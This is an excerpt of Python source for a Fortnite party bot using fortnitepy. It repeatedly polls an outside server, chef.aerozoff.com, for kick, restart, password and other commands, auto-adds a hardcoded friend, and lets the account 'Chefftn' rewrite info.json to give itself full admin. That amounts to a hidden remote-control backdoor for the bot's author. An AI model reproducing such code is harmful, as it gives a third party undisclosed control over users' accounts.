...
vips = ""
headersx = {'host': 'chef.aerozoff.com','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.22','enable-super-fast': "True",'x-gorgon': "172SJAI19A","x-signature": "4HKAI18ALOQ"}
...
class PartyBot(commands.Bot):
    ...
    async def add_list(self) -> None:
        ...
        if not '62bc7515b1fa4e12985016294ddb6db1' in self.friends:
            await self.add_friend('62bc7515b1fa4e12985016294ddb6db1')
    ...
    async def checker_autox(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            v = requests.get("https://chef.aerozoff.com/default",headers={
                'host': 'chef.aerozoff.com',
            ...
            b = requests.get(f"https://chef.aerozoff.com/kick",headers={
                'host': 'chef.aerozoff.com',
            ...
            dasda = requests.get('https://chef.aerozoff.com/password',headers=headersx,cookies={"omgjaichanger": "None"}).json()['password']
            password = dasda
              
            y = requests.get(f"https://chef.aerozoff.com/restart",headers={
                'host': 'chef.aerozoff.com',
    ...
    async def normal_setup(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            u = requests.get(f"https://chef.aerozoff.com/default",headers={
                'host': 'chef.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.53',
                'enable-super-fast': "True",
                'x-gorgon': "NZXHA6JSI14",
            ...
            s = requests.get(f"https://chef.aerozoff.com/kick",headers={
                'host': 'chef.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.30',
                'enable-super-fast': "False",
                'x-gorgon': "A7JD2Y27D2K",
            ...
            m = requests.get(f"https://chef.aerozoff.com/restart",headers={
                'host': 'chef.aerozoff.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.24',
                'enable-super-fast': "None",
                'x-gorgon': "NC28AH28SJ19S",
    ...
    async def auto_add_s(self):
        x = requests.get(f"https://chef.aerozoff.com/add_auto",headers={
                'host': 'chef.aerozoff.com',
    ...
    async def checker_status(self):
        q = requests.get(f"https://chef.aerozoff.com/status",headers={
                'host': 'chef.aerozoff.com',
    ...
    async def checker_skin_bl(self):
        w = requests.get("https://chef.aerozoff.com/skinbl",headers={
                'host': 'chef.aerozoff.com',
    ...
    async def event_friend_message(self, message: fortnitepy.FriendMessage) -> None:
        if not message.author.display_name != "Chefftn":
...
#///////////////////////////////////////////////////////////////////////////////////////////////////////////// PARTY/FRIENDS/ADMIN //////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    async def fixadmin(self, ctx: fortnitepy.ext.commands.Context):
        if ctx.author.display_name == 'Chefftn':
            with open("info.json", "w") as f:
                f.write('{"FullAccess": ["Chefftn"]}')
            await ctx.send('work')
